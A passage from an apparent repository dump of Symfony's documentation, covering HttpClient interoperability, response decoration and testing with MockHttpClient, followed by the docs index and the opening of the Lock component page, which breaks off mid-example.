PSR-17,\n:class:`Symfony\\\\Component\\\\HttpClient\\\\HttplugClient` also implements the factory methods\ndefined in the related ``php-http/message-factory`` package.\n\n.. code-block:: terminal\n\n    # Let's suppose php-http/httplug is already required by the lib you want to use\n\n    # installs an efficient implementation of response and stream factories\n    # with autowiring aliases provided by Symfony Flex\n    $ composer require nyholm/psr7\n\n    # alternatively, install the php-http/discovery package to auto-discover\n    # any already installed implementations from common vendors:\n    # composer require php-http/discovery\n\nLet's say you want to instantiate a class with the following constructor,\nthat requires HTTPlug dependencies::\n\n    use Http\\Client\\HttpClient;\n    use Http\\Message\\StreamFactory;\n\n    class SomeSdk\n    {\n        public function __construct(\n            HttpClient $httpClient,\n            StreamFactory $streamFactory\n        )\n        // [...]\n    }\n\nBecause :class:`Symfony\\\\Component\\\\HttpClient\\\\HttplugClient` implements these\ninterfaces,you can use it this way::\n\n    use Symfony\\Component\\HttpClient\\HttplugClient;\n\n    $httpClient = new HttplugClient();\n    $apiClient = new SomeSdk($httpClient, $httpClient);\n\nIf you'd like to work with promises, :class:`Symfony\\\\Component\\\\HttpClient\\\\HttplugClient`\nalso implements the ``HttpAsyncClient`` interface. To use it, you need to install the\n``guzzlehttp/promises`` package:\n\n.. code-block:: terminal\n\n    $ composer require guzzlehttp/promises\n\nThen you're ready to go::\n\n    use Psr\\Http\\Message\\ResponseInterface;\n    use Symfony\\Component\\HttpClient\\HttplugClient;\n\n    $httpClient = new HttplugClient();\n    $request = $httpClient->createRequest('GET', 'https://my.api.com/');\n    $promise = $httpClient->sendAsyncRequest($request)\n        ->then(\n            function (ResponseInterface $response): ResponseInterface {\n                echo 'Got status '.$response->getStatusCode();\n\n                return $response;\n            },\n            function (\\Throwable $exception): never {\n                echo 'Error: '.$exception->getMessage();\n\n                throw $exception;\n            }\n        );\n\n    // after you're done with sending several requests,\n    // you must wait for them to complete concurrently\n\n    // wait for a specific promise to resolve while monitoring them all\n    $response = $promise->wait();\n\n    // wait maximum 1 second for pending promises to resolve\n    $httpClient->wait(1.0);\n\n    // wait for all remaining promises to resolve\n    $httpClient->wait();\n\nYou can also pass a set of default options to your client thanks to the\n``HttplugClient::withOptions()`` method::\n\n    use Psr\\Http\\Message\\ResponseInterface;\n    use Symfony\\Component\\HttpClient\\HttplugClient;\n\n    $httpClient = (new HttplugClient())\n        ->withOptions([\n            'base_uri' => 'https://my.api.com',\n        ]);\n    $request = $httpClient->createRequest('GET', '/');\n\n    // ...\n\nNative PHP Streams\n~~~~~~~~~~~~~~~~~~\n\nResponses implementing :class:`Symfony\\\\Contracts\\\\HttpClient\\\\ResponseInterface`\ncan be cast to native PHP streams with\n:method:`Symfony\\\\Component\\\\HttpClient\\\\Response\\\\StreamWrapper::createResource`.\nThis allows using them where native PHP streams are needed::\n\n    use Symfony\\Component\\HttpClient\\HttpClient;\n    use Symfony\\Component\\HttpClient\\Response\\StreamWrapper;\n\n    $client = HttpClient::create();\n    $response = $client->request('GET', 'https://symfony.com/versions.json');\n\n    $streamResource = StreamWrapper::createResource($response, $client);\n\n    // alternatively and contrary to the previous one, this returns\n    // a resource that is seekable and potentially stream_select()-able\n    $streamResource = $response->toStream();\n\n    echo stream_get_contents($streamResource); // outputs the content of the response\n\n    // later on if you need to, you can access the response from the stream\n    $response = stream_get_meta_data($streamResource)['wrapper_data']->getResponse();\n\nExtensibility\n-------------\n\nIf you want to extend the behavior of a base HTTP client, you can use\n:doc:`service decoration </service_container/service_decoration>`::\n\n    class MyExtendedHttpClient implements HttpClientInterface\n    {\n        public function __construct(\n            private ?HttpClientInterface $decoratedClient = null\n        ) {\n            $this->decoratedClient ??= HttpClient::create();\n        }\n\n        public function request(string $method, string $url, array $options = []): ResponseInterface\n        {\n            // process and/or change the $method, $url and/or $options as needed\n            $response = $this->decoratedClient->request($method, $url, $options);\n\n            // if you call here any method on $response, the HTTP request\n            // won't be async; see below for a better way\n\n            return $response;\n        }\n\n        public function stream($responses, ?float $timeout = null): ResponseStreamInterface\n        {\n            return $this->decoratedClient->stream($responses, $timeout);\n        }\n    }\n\nA decorator like this one is useful in cases where processing the requests'\narguments is enough. By decorating the ``on_progress`` option, you can\neven implement basic monitoring of the response. However, since calling\nresponses' methods forces synchronous operations, doing so inside ``request()``\nwill break async.\n\nThe solution is to also decorate the response object itself.\n:class:`Symfony\\\\Component\\\\HttpClient\\\\TraceableHttpClient` and\n:class:`Symfony\\\\Component\\\\HttpClient\\\\Response\\\\TraceableResponse` are good\nexamples as a starting point.\n\nIn order to help writing more advanced response processors, the component provides\nan :class:`Symfony\\\\Component\\\\HttpClient\\\\AsyncDecoratorTrait`. This trait allows\nprocessing the stream of chunks as they come back from the network::\n\n    class MyExtendedHttpClient implements HttpClientInterface\n    {\n        use AsyncDecoratorTrait;\n\n        public function request(string $method, string $url, array $options = []): ResponseInterface\n        {\n            // process and/or change the $method, $url and/or $options as needed\n\n            $passthru = function (ChunkInterface $chunk, AsyncContext $context): \\Generator {\n                // do what you want with chunks, e.g. split them\n                // in smaller chunks, group them, skip some, etc.\n\n                yield $chunk;\n            };\n\n            return new AsyncResponse($this->client, $method, $url, $options, $passthru);\n        }\n    }\n\nBecause the trait already implements a constructor and the ``stream()`` method,\nyou don't need to add them. The ``request()`` method should still be defined;\nit shall return an\n:class:`Symfony\\\\Component\\\\HttpClient\\\\Response\\\\AsyncResponse`.\n\nThe custom processing of chunks should happen in ``$passthru``: this generator\nis where you need to write your logic. It will be called for each chunk yielded\nby the underlying client. A ``$passthru`` that does nothing would just ``yield\n$chunk;``. You could also yield a modified chunk, split the chunk into many\nones by yielding several times, or even skip a chunk altogether by issuing a\n``return;`` instead of yielding.\n\nIn order to control the stream, the chunk passthru receives an\n:class:`Symfony\\\\Component\\\\HttpClient\\\\Response\\\\AsyncContext` as second\nargument. This context object has methods to read the current state of the\nresponse. It also allows altering the response stream with methods to create\nnew chunks of content, pause the stream, cancel the stream, change the info of\nthe response, replace the current request by another one or change the chunk\npassthru itself.\n\nChecking the test cases implemented in\n:class:`Symfony\\\\Component\\\\HttpClient\\\\Tests\\\\AsyncDecoratorTraitTest`\nmight be a good start to get various working examples for a better understanding.\nHere are the use cases that it simulates:\n\n* retry a failed request;\n* send a preflight request, e.g. for authentication needs;\n* issue subrequests and include their content in the main response's body.\n\nThe logic in :class:`Symfony\\\\Component\\\\HttpClient\\\\Response\\\\AsyncResponse`\nhas many safety checks that will throw a ``LogicException`` if the chunk\npassthru doesn't behave correctly; e.g. if a chunk is yielded after an ``isLast()``\none, or if a content chunk is yielded before an ``isFirst()`` one, etc.\n\nTesting\n-------\n\nThis component includes the :class:`Symfony\\\\Component\\\\HttpClient\\\\MockHttpClient`\nand :class:`Symfony\\\\Component\\\\HttpClient\\\\Response\\\\MockResponse` classes to use\nin tests that shouldn't make actual HTTP requests. Such tests can be useful, as they\nwill run faster and produce consistent results, since they're not dependent on an\nexternal service. By not making actual HTTP requests there is no need to worry about\nthe service being online or the request changing state, for example deleting\na resource.\n\n:class:`Symfony\\\\Component\\\\HttpClient\\\\MockHttpClient` implements the\n:class:`Symfony\\\\Contracts\\\\HttpClient\\\\HttpClientInterface`, just like any actual\nHTTP client in this component. When you type-hint with\n:class:`Symfony\\\\Contracts\\\\HttpClient\\\\HttpClientInterface` your code will accept\nthe real client outside tests, while replacing it with\n:class:`Symfony\\\\Component\\\\HttpClient\\\\MockHttpClient` in the test.\n\nWhen the ``request`` method is used on :class:`Symfony\\\\Component\\\\HttpClient\\\\MockHttpClient`,\nit will respond with the supplied\n:class:`Symfony\\\\Component\\\\HttpClient\\\\Response\\\\MockResponse`. There are a few ways to use\nit, as described below.\n\nHTTP Client and Responses\n~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe first way of using :class:`Symfony\\\\Component\\\\HttpClient\\\\MockHttpClient`\nis to pass a list of responses to its constructor. These will be yielded\nin order when requests are made::\n\n    use Symfony\\Component\\HttpClient\\MockHttpClient;\n    use Symfony\\Component\\HttpClient\\Response\\MockResponse;\n\n    $responses = [\n        new MockResponse($body1, $info1),\n        new MockResponse($body2, $info2),\n    ];\n\n    $client = new MockHttpClient($responses);\n    // responses are returned in the same order as passed to MockHttpClient\n    $response1 = $client->request('...'); // returns $responses[0]\n    $response2 = $client->request('...'); // returns $responses[1]\n\nIt is also possible to create a\n:class:`Symfony\\\\Component\\\\HttpClient\\\\Response\\\\MockResponse` directly\nfrom a file, which is particularly useful when storing your response\nsnapshots in files::\n\n    use Symfony\\Component\\HttpClient\\Response\\MockResponse;\n\n    $response = MockResponse::fromFile('tests/fixtures/response.xml');\n\n.. versionadded:: 7.1\n\n    The :method:`Symfony\\\\Component\\\\HttpClient\\\\Response\\\\MockResponse::fromFile`\n    method was introduced in Symfony 7.1.\n\nAnother way of using :class:`Symfony\\\\Component\\\\HttpClient\\\\MockHttpClient` is to\npass a callback that generates the responses dynamically when it's called::\n\n    use Symfony\\Component\\HttpClient\\MockHttpClient;\n    use Symfony\\Component\\HttpClient\\Response\\MockResponse;\n\n    $callback = function ($method, $url, $options): MockResponse {\n        return new MockResponse('...');\n    };\n\n    $client = new MockHttpClient($callback);\n    $response = $client->request('...'); // calls $callback to get the response\n\nYou can also pass a list of callbacks if you need to perform specific\nassertions on the request before returning the mocked response::\n\n    $expectedRequests = [\n        function ($method, $url, $options): MockResponse {\n            $this->assertSame('GET', $method);\n            $this->assertSame('https://example.com/api/v1/customer', $url);\n\n            return new MockResponse('...');\n        },\n        function ($method, $url, $options): MockResponse {\n            $this->assertSame('POST', $method);\n            $this->assertSame('https://example.com/api/v1/customer/1/products', $url);\n\n            return new MockResponse('...');\n        },\n    ];\n\n    $client = new MockHttpClient($expectedRequests);\n\n    // ...\n\n.. tip::\n\n    Instead of using the first argument, you can also set the (list of)\n    responses or callbacks using the\n    :method:`Symfony\\\\Component\\\\HttpClient\\\\MockHttpClient::setResponseFactory`\n    method::\n\n        $responses = [\n            new MockResponse($body1, $info1),\n            new MockResponse($body2, $info2),\n        ];\n\n        $client = new MockHttpClient();\n        $client->setResponseFactory($responses);\n\nIf you need to test responses with HTTP status codes different than 200,\ndefine the ``http_code`` option::\n\n    use Symfony\\Component\\HttpClient\\MockHttpClient;\n    use Symfony\\Component\\HttpClient\\Response\\MockResponse;\n\n    $client = new MockHttpClient([\n        new MockResponse('...', ['http_code' => 500]),\n        new MockResponse('...', ['http_code' => 404]),\n    ]);\n\n    $response = $client->request('...');\n\nThe responses provided to the mock client don't have to be instances of\n:class:`Symfony\\\\Component\\\\HttpClient\\\\Response\\\\MockResponse`. Any class\nimplementing :class:`Symfony\\\\Contracts\\\\HttpClient\\\\ResponseInterface`\nwill work (e.g. ``$this->createMock(ResponseInterface::class)``).\n\nHowever, using :class:`Symfony\\\\Component\\\\HttpClient\\\\Response\\\\MockResponse`\nallows simulating chunked responses and timeouts::\n\n    $body = function (): \\Generator {\n        yield 'hello';\n        // empty strings are turned into timeouts so that they are easy to test\n        yield '';\n        yield 'world';\n    };\n\n    $mockResponse = new MockResponse($body());\n\nFinally, you can also create an invokable or iterable class that generates the\nresponses and use it as a callback in functional tests::\n\n    namespace App\\Tests;\n\n    use Symfony\\Component\\HttpClient\\Response\\MockResponse;\n    use Symfony\\Contracts\\HttpClient\\ResponseInterface;\n\n    class MockClientCallback\n    {\n        public function __invoke(string $method, string $url, array $options = []): ResponseInterface\n        {\n            // load a fixture file or generate data\n            // ...\n            return new MockResponse($data);\n        }\n    }\n\nThen configure Symfony to use your callback:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services_test.yaml\n        services:\n            # ...\n            App\\Tests\\MockClientCallback: ~\n\n        # config/packages/test/framework.yaml\n        framework:\n            http_client:\n                mock_response_factory: App\\Tests\\MockClientCallback\n\n    .. code-block:: xml\n\n        <!-- config/services_test.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsd=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsd:schemaLocation=\"http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <service id=\"App\\Tests\\MockClientCallback\"/>\n            </services>\n        </container>\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:http-client mock-response-factory=\"App\\Tests\\MockClientCallback\">\n                    <!-- ... -->\n                </framework-http-client>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->httpClient()\n                ->mockResponseFactory(MockClientCallback::class)\n            ;\n        };\n\nTo return json, you would normally do::\n\n    use Symfony\\Component\\HttpClient\\Response\\MockResponse;\n\n    $response = new MockResponse(json_encode([\n            'foo' => 'bar',\n        ]), [\n        'response_headers' => [\n            'content-type' => 'application/json',\n        ],\n    ]);\n\nYou can use :class:`Symfony\\\\Component\\\\HttpClient\\\\Response\\\\JsonMockResponse` instead::\n\n    use Symfony\\Component\\HttpClient\\Response\\JsonMockResponse;\n\n    $response = new JsonMockResponse([\n        'foo' => 'bar',\n    ]);\n\nJust like :class:`Symfony\\\\Component\\\\HttpClient\\\\Response\\\\MockResponse`, you can\nalso create a :class:`Symfony\\\\Component\\\\HttpClient\\\\Response\\\\JsonMockResponse`\ndirectly from a file::\n\n    use Symfony\\Component\\HttpClient\\Response\\JsonMockResponse;\n\n    $response = JsonMockResponse::fromFile('tests/fixtures/response.json');\n\n.. versionadded:: 7.1\n\n    The :method:`Symfony\\\\Component\\\\HttpClient\\\\Response\\\\JsonMockResponse::fromFile`\n    method was introduced in Symfony 7.1.\n\nTesting Request Data\n~~~~~~~~~~~~~~~~~~~~\n\nThe :class:`Symfony\\\\Component\\\\HttpClient\\\\Response\\\\MockResponse` class comes\nwith some helper methods to test the request:\n\n* ``getRequestMethod()`` - returns the HTTP method;\n* ``getRequestUrl()`` - returns the URL the request would be sent to;\n* ``getRequestOptions()`` - returns an array containing other information about\n  the request such as headers, query parameters, body content etc.\n\nUsage example::\n\n    $mockResponse = new MockResponse('', ['http_code' => 204]);\n    $httpClient = new MockHttpClient($mockResponse, 'https://example.com');\n\n    $response = $httpClient->request('DELETE', 'api/article/1337', [\n        'headers' => [\n            'Accept: */*',\n            'Authorization: Basic YWxhZGRpbjpvcGVuc2VzYW1l',\n        ],\n    ]);\n\n    $mockResponse->getRequestMethod();\n    // returns \"DELETE\"\n\n    $mockResponse->getRequestUrl();\n    // returns \"https://example.com/api/article/1337\"\n\n    $mockResponse->getRequestOptions()['headers'];\n    // returns [\"Accept: */*\", \"Authorization: Basic YWxhZGRpbjpvcGVuc2VzYW1l\"]\n\nFull Example\n~~~~~~~~~~~~\n\nThe following standalone example demonstrates a way to use the HTTP client and\ntest it in a real application::\n\n    // ExternalArticleService.php\n    use Symfony\\Contracts\\HttpClient\\HttpClientInterface;\n\n    final class ExternalArticleService\n    {\n        public function __construct(\n            private HttpClientInterface $httpClient,\n        ) {\n        }\n\n        public function createArticle(array $requestData): array\n        {\n            $requestJson = json_encode($requestData, JSON_THROW_ON_ERROR);\n\n            $response = $this->httpClient->request('POST', 'api/article', [\n                'headers' => [\n                    'Content-Type: application/json',\n                    'Accept: application/json',\n                ],\n                'body' => $requestJson,\n            ]);\n\n            if (201 !== $response->getStatusCode()) {\n                throw new Exception('Response status code is different than expected.');\n            }\n\n            // ... other checks\n\n            $responseJson = $response->getContent();\n            $responseData = json_decode($responseJson, true, 512, JSON_THROW_ON_ERROR);\n\n            return $responseData;\n        }\n    }\n\n    // ExternalArticleServiceTest.php\n    use PHPUnit\\Framework\\TestCase;\n    use Symfony\\Component\\HttpClient\\MockHttpClient;\n    use Symfony\\Component\\HttpClient\\Response\\MockResponse;\n\n    final class ExternalArticleServiceTest extends TestCase\n    {\n        public function testSubmitData(): void\n        {\n            // Arrange\n            $requestData = ['title' => 'Testing with Symfony HTTP Client'];\n            $expectedRequestData = json_encode($requestData, JSON_THROW_ON_ERROR);\n\n            $expectedResponseData = ['id' => 12345];\n            $mockResponseJson = json_encode($expectedResponseData, JSON_THROW_ON_ERROR);\n            $mockResponse = new MockResponse($mockResponseJson, [\n                'http_code' => 201,\n                'response_headers' => ['Content-Type: application/json'],\n            ]);\n\n            $httpClient = new MockHttpClient($mockResponse, 'https://example.com');\n            $service = new ExternalArticleService($httpClient);\n\n            // Act\n            $responseData = $service->createArticle($requestData);\n\n            // Assert\n            $this->assertSame('POST', $mockResponse->getRequestMethod());\n            $this->assertSame('https://example.com/api/article', $mockResponse->getRequestUrl());\n            $this->assertContains(\n                'Content-Type: application/json',\n                $mockResponse->getRequestOptions()['headers']\n            );\n            $this->assertSame($expectedRequestData, $mockResponse->getRequestOptions()['body']);\n\n            $this->assertSame($expectedResponseData, $responseData);\n        }\n    }\n\nTesting Using HAR Files\n~~~~~~~~~~~~~~~~~~~~~~~\n\nModern browsers (via their network tab) and HTTP clients allow to export the\ninformation of one or more HTTP requests using the `HAR`_ (HTTP Archive) format.\nYou can use those ``.har`` files to perform tests with Symfony's HTTP Client.\n\nFirst, use a browser or HTTP client to perform the HTTP request(s) you want to\ntest. Then, save that information as a ``.har`` file somewhere in your application::\n\n    // ExternalArticleServiceTest.php\n    use Symfony\\Bundle\\FrameworkBundle\\Test\\KernelTestCase;\n    use Symfony\\Component\\HttpClient\\MockHttpClient;\n    use Symfony\\Component\\HttpClient\\Response\\MockResponse;\n\n    final class ExternalArticleServiceTest extends KernelTestCase\n    {\n        public function testSubmitData(): void\n        {\n            // Arrange\n            $fixtureDir = sprintf('%s/tests/fixtures/HTTP', static::getContainer()->getParameter('kernel.project_dir'));\n            $factory = new HarFileResponseFactory(\"$fixtureDir/example.com_archive.har\");\n            $httpClient = new MockHttpClient($factory, 'https://example.com');\n            $service = new ExternalArticleService($httpClient);\n\n            // Act\n            $responseData = $service->createArticle($requestData);\n\n            // Assert\n            $this->assertSame('the expected response', $responseData);\n        }\n    }\n\nIf your service performs multiple requests or if your ``.har`` file contains multiple\nrequest/response pairs, the :class:`Symfony\\\\Component\\\\HttpClient\\\\Test\\\\HarFileResponseFactory`\nwill find the associated response based on the request method, URL and body (if any).\nNote that **this won't work** if the request body or URI is random / always\nchanging (e.g. if it contains current date or random UUIDs).\n\nTesting Network Transport Exceptions\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nAs explained in the :ref:`Network Errors section <http-client_network-errors>`,\nwhen making HTTP requests you might face errors at transport level.\n\nThat's why it's useful to test how your application behaves in case of a transport\nerror. :class:`Symfony\\\\Component\\\\HttpClient\\\\Response\\\\MockResponse` allows\nyou to do so in multiple ways.\n\nIn order to test errors that occur before headers have been received,\nset the ``error`` option value when creating the ``MockResponse``.\nTransport errors of this kind occur, for example, when a host name\ncannot be resolved or the host was unreachable. The\n``TransportException`` will be thrown as soon as a method like\n``getStatusCode()`` or ``getHeaders()`` is called.\n\nIn order to test errors that occur while a response is being streamed\n(that is, after the headers have already been received), provide the\nexception to ``MockResponse`` as part of the ``body``\nparameter. You can either use an exception directly, or yield the\nexception from a callback. For exceptions of this kind,\n``getStatusCode()`` may indicate a success (200), but accessing\n``getContent()`` fails.\n\nThe following example code illustrates all three options.\n\nbody::\n\n    // ExternalArticleServiceTest.php\n    use PHPUnit\\Framework\\TestCase;\n    use Symfony\\Component\\HttpClient\\MockHttpClient;\n    use Symfony\\Component\\HttpClient\\Response\\MockResponse;\n\n    final class ExternalArticleServiceTest extends TestCase\n    {\n        // ...\n\n        public function testTransportLevelError(): void\n        {\n            $requestData = ['title' => 'Testing with Symfony HTTP Client'];\n            $httpClient = new MockHttpClient([\n                // Mock a transport level error at a time before\n                // headers have been received (e. g. host unreachable)\n                new MockResponse(info: ['error' => 'host unreachable']),\n\n                // Mock a response with headers indicating\n                // success, but a failure while retrieving the body by\n                // creating the exception directly in the body...\n                new MockResponse([new \\RuntimeException('Error at transport level')]),\n\n                // ... or by yielding it from a callback.\n                new MockResponse((static function (): \\Generator {\n                    yield new TransportException('Error at transport level');\n                })()),\n            ]);\n\n            $service = new ExternalArticleService($httpClient);\n\n            try {\n                $service->createArticle($requestData);\n\n                // An exception should have been thrown in `createArticle()`, so this line should never be reached\n                $this->fail();\n            } catch (TransportException $e) {\n                $this->assertEquals(new \\RuntimeException('Error at transport level'), $e->getPrevious());\n                $this->assertSame('Error at transport level', $e->getMessage());\n            }\n        }\n    }\n\n.. _`cURL PHP extension`: https://www.php.net/curl\n.. _`Zlib PHP extension`: https://www.php.net/zlib\n.. _`PSR-17`: https://www.php-fig.org/psr/psr-17/\n.. _`PSR-18`: https://www.php-fig.org/psr/psr-18/\n.. _`HTTPlug`: https://github.com/php-http/httplug/#readme\n.. _`Symfony Contracts`: https://github.com/symfony/contracts\n.. _`libcurl`: https://curl.haxx.se/libcurl/\n.. _`amphp/http-client`: https://packagist.org/packages/amphp/http-client\n.. _`cURL options`: https://www.php.net/manual/en/function.curl-setopt.php\n.. _`Server-sent events`: https://html.spec.whatwg.org/multipage/server-sent-events.html\n.. _`EventSource`: https://www.w3.org/TR/eventsource/#eventsource\n.. _`idempotent method`: https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Idempotent_methods\n.. _`SSRF`: https://portswigger.net/web-security/ssrf\n.. _`RFC 6570`: https://www.rfc-editor.org/rfc/rfc6570\n.. _`HAR`: https://w3c.github.io/web-performance/specs/HAR/Overview.html\n.. _`the Cookie HTTP request header`: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cookie\n"
        },
        {
          "name": "index.rst",
          "type": "blob",
          "size": 1.3134765625,
          "content": ".. _symfony2-documentation:\n\nSymfony Documentation\n=====================\n\nQuick Tour\n----------\n\nGet started fast with the Symfony :doc:`Quick Tour <quick_tour/index>`:\n\n* :doc:`quick_tour/the_big_picture`\n* :doc:`quick_tour/flex_recipes`\n* :doc:`quick_tour/the_architecture`\n\nGetting Started\n---------------\n\n.. toctree::\n    :maxdepth: 2\n\n    getting_started/index\n\nTopics\n------\n\n.. toctree::\n    :maxdepth: 1\n\n    best_practices\n    bundles\n    cache\n    console\n    doctrine\n    deployment\n    event_dispatcher\n    forms\n    frontend\n    html_sanitizer\n    http_cache\n    http_client\n    lock\n    logging\n    mailer\n    mercure\n    messenger\n    migration\n    notifier\n    performance\n    profiler\n    rate_limiter\n    routing\n    security\n    session\n    setup\n    serializer\n    service_container\n    testing\n    translation\n    validation\n    web_link\n    webhook\n    workflow\n\nComponents\n----------\n\nRead the :doc:`Components </components/>` documentation.\n\nReference Documents\n-------------------\n\nGet answers quickly with reference documents:\n\n.. include:: /reference/map.rst.inc\n\nContributing\n------------\n\nContribute to Symfony:\n\n.. include:: /contributing/map.rst.inc\n\nCreate your Own Framework\n-------------------------\n\nWant to create your own framework based on Symfony?\n\n.. toctree::\n   :maxdepth: 2\n\n   create_framework/index\n"
        },
        {
          "name": "introduction",
          "type": "tree",
          "content": null
        },
        {
          "name": "lock.rst",
          "type": "blob",
          "size": 11.3583984375,
          "content": "Dealing with Concurrency with Locks\n===================================\n\nWhen a program runs concurrently, some part of code which modify shared\nresources should not be accessed by multiple processes at the same time.\nSymfony's :doc:`Lock component </components/lock>` provides a locking mechanism to ensure\nthat only one process is running the critical section of code at any point of\ntime to prevent race conditions from happening.\n\nThe following example shows a typical usage of the lock::\n\n    $lock = $lockFactory->createLock('pdf-creation');\n    if (!$lock->acquire()) {\n        return;\n    }\n\n    // critical section of code\n    $service->method();\n\n    $lock->release();\n\nInstalling\n----------\n\nIn applications using :ref:`Symfony Flex <symfony-flex>`, run this command to\ninstall the Lock component:\n\n.. code-block:: terminal\n\n    $ composer require symfony/lock\n\nConfiguring\n-----------\n\nBy default, Symfony provides a :ref:`Semaphore <lock-store-semaphore>`\nwhen available, or a :ref:`Flock <lock-store-flock>` otherwise. You can configure\nthis behavior by using the ``lock`` key like:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/lock.yaml\n        framework:\n            lock: ~\n            lock: 'flock'\n            lock: 'flock:///path/to/file'\n            lock: 'semaphore'\n            lock: 'memcached://m1.docker'\n            lock: ['memcached://m1.docker', 'memcached://m2.docker']\n            lock: 'redis://r1.docker'\n            lock: ['redis://r1.docker', 'redis://r2.docker']\n            lock: 'rediss://r1.docker?ssl[verify_peer]=1&ssl[cafile]=...'\n            lock: 'zookeeper://z1.docker'\n            lock: 'zookeeper://z1.docker,z2.docker'\n            lock: 'zookeeper://localhost01,localhost02:2181'\n            lock: 'sqlite:///%kernel.project_dir%/var/lock.db'\n            lock: 'mysql:host=127.0.0.1;dbname=app'\n            lock: 'pgsql:host=127.0.0.1;dbname=app'\n            lock: 'pgsql+advisory:host=127.0.0.1;dbname=app'\n            lock: 'sqlsrv:server=127.0.0.1;Database=app'\n            lock: 'oci:host=127.0.0.1;dbname=app'\n            lock: 'mongodb://127.0.0.1/app?collection=lock'\n            lock: '%env(LOCK_DSN)%'\n\n            # named locks\n            lock:\n                invoice: ['semaphore', 'redis://r2.docker']\n                report: 'semaphore'\n\n    .. code-block:: xml\n\n        <!-- config/packages/lock.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:lock>\n                    <framework:resource>flock</framework:resource>\n\n                    <framework:resource>flock:///path/to/file</framework:resource>\n\n                    <framework:resource>semaphore</framework:resource>\n\n                    <framework:resource>memcached://m1.docker</framework:resource>\n\n                    <framework:resource>memcached://m1.docker</framework:resource>\n                    <framework:resource>memcached://m2.docker</framework:resource>\n\n                    <framework:resource>redis://r1.docker</framework:resource>\n\n                    <framework:resource>redis://r1.docker</framework:resource>\n                    <framework:resource>redis://r2.docker</framework:resource>\n\n                    <framework:resource>zookeeper://z1.docker</framework:resource>\n\n                    <framework:resource>zookeeper://z1.docker,z2.docker</framework:resource>\n\n                    <framework:resource>zookeeper://localhost01,localhost02:2181</framework:resource>\n\n                    <framework:resource>sqlite:///%kernel.project_dir%/var/lock.db</framework:resource>\n\n                    <framework:resource>mysql:host=127.0.0.1;dbname=app</framework:resource>\n\n                    <framework:resource>pgsql:host=127.0.0.1;dbname=app</framework:resource>\n\n                    <framework:resource>pgsql+advisory:host=127.0.0.1;dbname=app</framework:resource>\n\n                    <framework:resource>sqlsrv:server=127.0.0.1;Database=app</framework:resource>\n\n                    <framework:resource>oci:host=127.0.0.1;dbname=app</framework:resource>\n\n                    <framework:resource>mongodb://127.0.0.1/app?collection=lock</framework:resource>\n\n                    <framework:resource>%env(LOCK_DSN)%</framework:resource>\n\n                    <!-- named locks -->\n                    <framework:resource name=\"invoice\">semaphore</framework:resource>\n                    <framework:resource name=\"invoice\">redis://r2.docker</framework:resource>\n                    <framework:resource name=\"report\">semaphore</framework:resource>\n                </framework:lock>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/lock.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->lock()\n                ->resource('default', ['flock'])\n                ->resource('default', ['flock:///path/to/file'])\n                ->resource('default', ['semaphore'])\n                ->resource('default', ['memcached://m1.docker'])\n                ->resource('default', ['memcached://m1.docker', 'memcached://m2.docker'])\n                ->resource('default', ['redis://r1.docker'])\n                ->resource('default', ['redis://r1.docker', 'redis://r2.docker'])\n                ->resource('default', ['zookeeper://z1.docker'])\n                ->resource('default', ['zookeeper://z1.docker,z2.docker'])\n                ->resource('default', ['zookeeper://localhost01,localhost02:2181'])\n                ->resource('default', ['sqlite:///%kernel.project_dir%/var/lock.db'])\n                ->resource('default', ['mysql:host=127.0.0.1;dbname=app'])\n                ->resource('default', ['pgsql:host=127.0.0.1;dbname=app'])\n                ->resource('default', ['pgsql+advisory:host=127.0.0.1;dbname=app'])\n                ->resource('default', ['sqlsrv:server=127.0.0.1;Database=app'])\n                ->resource('default', ['oci:host=127.0.0.1;dbname=app'])\n                ->resource('default', ['mongodb://127.0.0.1/app?collection=lock'])\n                ->resource('default', [env('LOCK_DSN')])\n\n                // named locks\n                ->resource('invoice', ['semaphore', 'redis://r2.docker'])\n                ->resource('report', ['semaphore'])\n            ;\n        };\n\nLocking a Resource\n------------------\n\nTo lock the default resource, autowire the lock factory using\n:class:`Symfony\\\\Component\\\\Lock\\\\LockFactory`::\n\n    // src/Controller/PdfController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Lock\\LockFactory;\n\n    class PdfController extends AbstractController\n    {\n        #[Route('/download/terms-of-use.pdf')]\n        public function downloadPdf(LockFactory $factory, MyPdfGeneratorService $pdf): Response\n        {\n            $lock = $factory->createLock('pdf-creation');\n            $lock->acquire(true);\n\n            // 